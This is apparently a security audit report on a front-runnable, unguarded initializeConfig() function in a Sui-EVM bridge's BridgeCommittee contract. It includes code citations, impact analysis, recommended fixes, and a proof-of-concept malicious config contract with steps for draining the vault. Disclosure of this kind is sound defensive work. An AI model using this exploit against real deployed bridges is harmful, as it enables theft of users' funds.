### Title
Unguarded Two-Step Initialization in `BridgeCommittee.initializeConfig()` Allows Front-Running to Inject Malicious Config, Enabling Vault Drain — (`bridge/evm/contracts/BridgeCommittee.sol`)

---

### Summary

`BridgeCommittee` uses a two-step initialization: `initialize()` sets committee members (protected by OpenZeppelin's `initializer` modifier), but `initializeConfig()` — which binds the critical `IBridgeConfig` contract — has **no access control at all**. Any unprivileged caller can front-run the deployer's `initializeConfig` call and inject a malicious config. Every downstream bridge function that reads `committee.config()` — including `SuiBridge.transferBridgedTokensWithSignatures()` — then operates on attacker-controlled token addresses and decimal values, enabling vault drainage via inflated transfer amounts.

---

### Finding Description

`BridgeCommittee.initializeConfig` is declared `external` with only a one-time guard (`config == address(0)`):

```solidity
// bridge/evm/contracts/BridgeCommittee.sol  line 63-66
function initializeConfig(address _config) external {
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}
``` [1](#0-0) 

There is no `onlyOwner`, no `initializer`, and no role check. The intended deployment sequence in `deploy_bridge.s.sol` is:

1. Deploy `BridgeCommittee` proxy → call `initialize()` (committee members set)
2. Deploy `BridgeConfig` proxy → call `initialize()` (token/chain registry set)
3. Call `committee.initializeConfig(address(bridgeConfig))` ← **front-runnable** [2](#0-1) 

Between steps 1 and 3, any address can call `committee.initializeConfig(maliciousConfig)`. The deployer's subsequent call reverts with "Config already initialized", and the committee is permanently bound to the attacker's contract.

The `config` reference is consumed in three critical places:

**1. `MessageVerifier.verifyMessageAndSignatures` (non-TOKEN_TRANSFER messages):**
```solidity
// bridge/evm/contracts/utils/MessageVerifier.sol  line 46
require(message.chainID == committee.config().chainID(), "MessageVerifier: Invalid chain ID");
``` [3](#0-2) 

A malicious config returning an arbitrary `chainID()` bypasses chain-ID domain separation for governance messages (EMERGENCY_OP, UPGRADE, UPDATE_BRIDGE_LIMIT, etc.).

**2. `SuiBridge.transferBridgedTokensWithSignatures` — decimal conversion:**
```solidity
// bridge/evm/contracts/SuiBridge.sol  lines 78-82
uint256 erc20AdjustedAmount = BridgeUtils.convertSuiToERC20Decimal(
    IERC20Metadata(config.tokenAddressOf(tokenTransferPayload.tokenID)).decimals(),
    config.tokenSuiDecimalOf(tokenTransferPayload.tokenID),
    tokenTransferPayload.amount
);
``` [4](#0-3) 

`convertSuiToERC20Decimal` computes `amount × 10^(erc20Decimals − suiDecimal)`. A malicious config returning `suiDecimal = 1` for ETH (which has 18 ERC20 decimals) inflates every transfer by `10^17`.

**3. `SuiBridge.transferBridgedTokensWithSignatures` — target chain check:**
```solidity
// bridge/evm/contracts/SuiBridge.sol  line 73-75
require(
    tokenTransferPayload.targetChain == config.chainID(), "SuiBridge: Invalid target chain"
);
``` [5](#0-4) 

A malicious config returning the attacker's chosen `chainID()` makes this check trivially passable.

---

### Impact Explanation

**Critical — direct fund theft from the bridge vault.**

When a legitimate committee quorum signs a real Sui→EVM token transfer message (e.g., bridging 1 ETH worth of tokens), the malicious config causes `erc20AdjustedAmount` to be computed as `1 × 10^17` instead of `1 × 10^9` (the correct Sui-decimal-adjusted value). `_transferTokensFromVault` then attempts to transfer `10^17` units of the real ERC20 token from the vault to the recipient, draining it in a single transaction. The committee signatures are valid (real validators signed a real Sui event); only the decimal conversion is corrupted by the injected config.

---

### Likelihood Explanation

**High.** The attack window exists on every deployment and redeployment. The attacker only needs to monitor the mempool for the `BridgeCommittee.initialize()` transaction and submit `initializeConfig(maliciousConfig)` with a higher gas price before the deployer's follow-up call. No special privilege, stake, or key material is required — any EOA can execute this. The deployment script confirms the gap exists as two separate transactions. [6](#0-5) 

---

### Recommendation

Add an access control guard to `initializeConfig`. The simplest fix is to restrict it to the deployer/owner, or to fold it into the `initialize` function so both steps are atomic:

```solidity
// Option A: restrict to deployer
address private _deployer;

function initialize(address[] memory committee, uint16[] memory stake, uint16 minStakeRequired)
    external initializer
{
    _deployer = msg.sender;
    // ... existing logic
}

function initializeConfig(address _config) external {
    require(msg.sender == _deployer, "BridgeCommittee: not deployer");
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}

// Option B: pass config address directly into initialize() and deploy atomically
```

Alternatively, use a factory pattern that deploys `BridgeCommittee`, `BridgeConfig`, and calls `initializeConfig` in a single atomic transaction, eliminating the front-runnable window entirely.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./BridgeCommittee.sol";
import "./interfaces/IBridgeConfig.sol";

contract MaliciousConfig is IBridgeConfig {
    // Returns suiDecimal = 1 for all tokens → inflates ERC20 amount by 10^17 for ETH
    function tokenSuiDecimalOf(uint8) external pure override returns (uint8) { return 1; }
    // Returns real WETH address so vault transfer succeeds
    function tokenAddressOf(uint8) external pure override returns (address) { return WETH_ADDRESS; }
    // Returns matching chainID so targetChain check passes
    function chainID() external pure override returns (uint8) { return TARGET_CHAIN_ID; }
    function isChainSupported(uint8) external pure override returns (bool) { return true; }
    function isTokenSupported(uint8) external pure override returns (bool) { return true; }
    function tokenPriceOf(uint8) external pure override returns (uint64) { return 1; }
}

// Attack:
// 1. Deployer broadcasts BridgeCommittee.initialize(members, stakes, minStake)
// 2. Attacker sees it in mempool, deploys MaliciousConfig, then calls:
//    committee.initializeConfig(address(maliciousConfig))   ← front-runs deployer
// 3. Deployer's initializeConfig call reverts; committee.config = maliciousConfig
// 4. Deployer (unaware) proceeds to deploy SuiBridge pointing to compromised committee
// 5. Next legitimate bridge transfer (signed by real validators) triggers:
//    erc20AdjustedAmount = amount * 10^(18 - 1) = amount * 10^17
//    → vault drained
``` [7](#0-6) [8](#0-7) [9](#0-8)

### Citations

**File:** bridge/evm/contracts/BridgeCommittee.sol (L59-66)
```text
    /// @notice Initializes the contract with the provided parameters.
    /// @dev This function should be called directly after config deployment. The config contract address
    /// provided should be verified before bridging any assets.
    /// @param _config The address of the BridgeConfig contract.
    function initializeConfig(address _config) external {
        require(address(config) == address(0), "BridgeCommittee: Config already initialized");
        config = IBridgeConfig(_config);
    }
```

**File:** bridge/evm/script/deploy_bridge.s.sol (L124-178)
```text
        address bridgeCommittee = Upgrades.deployUUPSProxy(
            "BridgeCommittee.sol",
            abi.encodeCall(
                BridgeCommittee.initialize,
                (
                    deployConfig.committeeMembers,
                    committeeMemberStake,
                    uint16(deployConfig.minCommitteeStakeRequired)
                )
            ),
            opts
        );

        // deploy bridge config =====================================================================

        // convert token prices from uint256 to uint64
        uint64[] memory tokenPrices = new uint64[](deployConfig.tokenPrices.length);
        for (uint256 i; i < deployConfig.tokenPrices.length; i++) {
            tokenPrices[i] = uint64(deployConfig.tokenPrices[i]);
        }

        // convert Sui Decimals from uint256 to uint8
        uint8[] memory suiDecimals = new uint8[](deployConfig.suiDecimals.length);
        for (uint256 i; i < deployConfig.suiDecimals.length; i++) {
            suiDecimals[i] = uint8(deployConfig.suiDecimals[i]);
        }

        // convert Token Id from uint256 to uint8
        uint8[] memory tokenIds = new uint8[](deployConfig.tokenIds.length);
        for (uint256 i; i < deployConfig.tokenIds.length; i++) {
            tokenIds[i] = uint8(deployConfig.tokenIds[i]);
        }

        address bridgeConfig = Upgrades.deployUUPSProxy(
            "BridgeConfig.sol",
            abi.encodeCall(
                BridgeConfig.initialize,
                (
                    address(bridgeCommittee),
                    uint8(deployConfig.sourceChainId),
                    deployConfig.supportedTokens,
                    tokenPrices,
                    tokenIds,
                    suiDecimals,
                    supportedChainIds
                )
            ),
            opts
        );

        // initialize config in the bridge committee
        BridgeCommittee(bridgeCommittee).initializeConfig(address(bridgeConfig));
        BridgeCommittee committeeImplementation =
            BridgeCommittee(Upgrades.getImplementationAddress(bridgeCommittee));
        committeeImplementation.initializeConfig(address(bridgeConfig));
```

**File:** bridge/evm/contracts/utils/MessageVerifier.sol (L33-52)
```text
    modifier verifyMessageAndSignatures(
        BridgeUtils.Message memory message,
        bytes[] memory signatures,
        uint8 messageType
    ) {
        // verify message type
        require(message.messageType == messageType, "MessageVerifier: message does not match type");
        // verify signatures
        committee.verifySignatures(signatures, message);
        // increment message type nonce
        if (messageType != BridgeUtils.TOKEN_TRANSFER) {
            // verify chain ID
            require(
                message.chainID == committee.config().chainID(), "MessageVerifier: Invalid chain ID"
            );
            require(message.nonce == nonces[message.messageType], "MessageVerifier: Invalid nonce");
            nonces[message.messageType]++;
        }
        _;
    }
```

**File:** bridge/evm/contracts/SuiBridge.sol (L55-103)
```text
    function transferBridgedTokensWithSignatures(
        bytes[] memory signatures,
        BridgeUtils.Message memory message
    )
        external
        nonReentrant
        verifyMessageAndSignatures(message, signatures, BridgeUtils.TOKEN_TRANSFER)
        onlySupportedChain(message.chainID)
    {
        // verify that message has not been processed
        require(!isTransferProcessed[message.nonce], "SuiBridge: Message already processed");

        IBridgeConfig config = committee.config();

        BridgeUtils.TokenTransferPayload memory tokenTransferPayload =
            BridgeUtils.decodeTokenTransferPayload(message.payload);

        // verify target chain ID is this chain ID
        require(
            tokenTransferPayload.targetChain == config.chainID(), "SuiBridge: Invalid target chain"
        );

        // convert amount to ERC20 token decimals
        uint256 erc20AdjustedAmount = BridgeUtils.convertSuiToERC20Decimal(
            IERC20Metadata(config.tokenAddressOf(tokenTransferPayload.tokenID)).decimals(),
            config.tokenSuiDecimalOf(tokenTransferPayload.tokenID),
            tokenTransferPayload.amount
        );

        _transferTokensFromVault(
            message.chainID,
            tokenTransferPayload.tokenID,
            tokenTransferPayload.recipientAddress,
            erc20AdjustedAmount
        );

        // mark message as processed
        isTransferProcessed[message.nonce] = true;

        emit TokensClaimed(
            message.chainID,
            message.nonce,
            config.chainID(),
            tokenTransferPayload.tokenID,
            erc20AdjustedAmount,
            tokenTransferPayload.senderAddress,
            tokenTransferPayload.recipientAddress
        );
    }
```
